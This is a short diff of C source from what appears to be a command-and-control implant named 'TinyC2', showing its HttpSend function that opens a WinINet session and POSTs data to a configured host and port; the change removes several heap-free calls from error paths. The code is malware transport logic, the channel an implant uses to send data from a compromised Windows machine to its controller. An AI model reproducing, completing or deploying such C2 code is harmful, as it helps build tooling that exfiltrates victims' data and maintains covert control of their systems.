@@ -35,35 +35,26 @@ BOOL HttpSend(CHANNEL_CONTEXT* Context, CONST CHAR* Data, DWORD Size, BOOL Regis
 	Chunk = (CHAR*)RtlAllocateHeap(hHeap, HEAP_ZERO_MEMORY, 4096);
 	if (!Chunk) {
 		DBG_PRINTF("failed to allocate memory for Chunk\n");
-		RtlFreeHeap(hHeap, 0, Buffer);
 		return FALSE;
 	}
 
 	if (!(hSession = InternetOpenA("TinyC2/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0))) {
 		DBG_PRINTF("InternetOpenA failed: ( %d )\n", GetLastError());
-		RtlFreeHeap(hHeap, 0, Chunk);
-		RtlFreeHeap(hHeap, 0, Buffer);
 		return FALSE;
 	}
 
 	if (!(hConnect = InternetConnectA(hSession, Config.Host, Config.Port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0))) {
 		DBG_PRINTF("InternetConnectA failed ( %d )\n", GetLastError());
-		RtlFreeHeap(hHeap, 0, Chunk);
-		RtlFreeHeap(hHeap, 0, Buffer);
 		goto cleanup;
 	}
 
 	if (!(hRequest = HttpOpenRequestA(hConnect, "POST", "/", NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0))) {
 		DBG_PRINTF("HttpOpenRequestA failed: ( %d )\n", GetLastError());
-		RtlFreeHeap(hHeap, 0, Chunk);
-		RtlFreeHeap(hHeap, 0, Buffer);
 		goto cleanup;
 	}
 
 	if (!HttpSendRequestA(hRequest, NULL, 0, (LPVOID)Data, Size)) {
 		DBG_PRINTF("HttpSendRequestA failed ( %d )\n", GetLastError());
-		RtlFreeHeap(hHeap, 0, Chunk);
-		RtlFreeHeap(hHeap, 0, Buffer);
 		goto cleanup;
 	}
 
